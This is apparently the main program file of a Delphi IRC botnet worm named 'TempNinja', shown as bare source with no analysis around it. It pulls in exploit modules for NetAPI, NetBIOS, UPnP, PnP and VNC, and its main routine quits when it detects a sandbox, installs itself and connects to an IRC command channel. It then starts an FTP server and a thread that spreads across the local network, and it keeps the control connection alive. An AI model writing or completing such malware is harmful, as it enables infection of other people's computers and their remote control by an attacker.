Program TempNinja;

uses
  Windows,
  Winsock,
  untFunctions,
  untGlobalDeclare,
  untSockets,
  untBot,
  untThreads,
  untCrypt,
  untOutputs,
  untScanner,
  untFTPD,
  untTCPIPPatcher,

  exNetAPI in 'exploits\exNetAPI.pas',
  upnp_spreader in 'exploits\upnp_spreader.pas',
  exNetbios in 'exploits\exNetbios.pas',
  exPNP in 'exploits\exPNP.pas',
  untNetBios,

  Messages,
  untRunOnClose in 'untRunOnClose.pas',
  exVNC in 'exploits\exVNC.pas',
  untHoneyPot in 'untHoneyPot.pas';

  {$R *.res}

var
  threadid      :dword;
  a             :string;
  f             :textfile;

begin
  initnetapifunctions;
  InitializeFunctions;

  if ninja_sandbox then
    exitprocess(0);

  SetErrorMode(SEM_NOGPFAULTERRORBOX);

  ptcpip;
  initializesettings;
  install;

  RunOnClose(pchar(bot_mutex), pchar(bot_mutex+'_'), pchar(paramstr(0)));

  thread_start(1, 3, 'outputbuffer', @outputmonitor, nil, false);

  thread_data.channel := g_irc_channel;
  thread_data.key := g_irc_key;
  thread_data.address := g_irc_host;
  thread_data.port := g_irc_port;
  thread_data.irc_prefix := g_irc_prefix;

  ftp_mainip := '';
  thread_start(1, 3, 'mainsocket', @start_ircthread, @thread_data, false);
  thread_start(1, 3, 'mainftp', @ftp_start, nil, false);
  thread_start(1, 3, 'localscan', @ninja_spreadlocal, nil, false);

  sleep(1000);

  repeat sleep(1); until ftp_ircsock <> invalid_socket;

  hp_start;

  while 1=1 do
  begin
    if not thread_exist(0, 'outputbuffer') then
      thread_start(1, 3, 'outputbuffer', @outputmonitor, nil, false);

    if not thread_exist(0, 'mainsocket') then
      thread_start(1, 3, 'mainsocket', @start_ircthread, @thread_data, false);

    sleep(5000);
  end;

  socket_cleanup;

end.

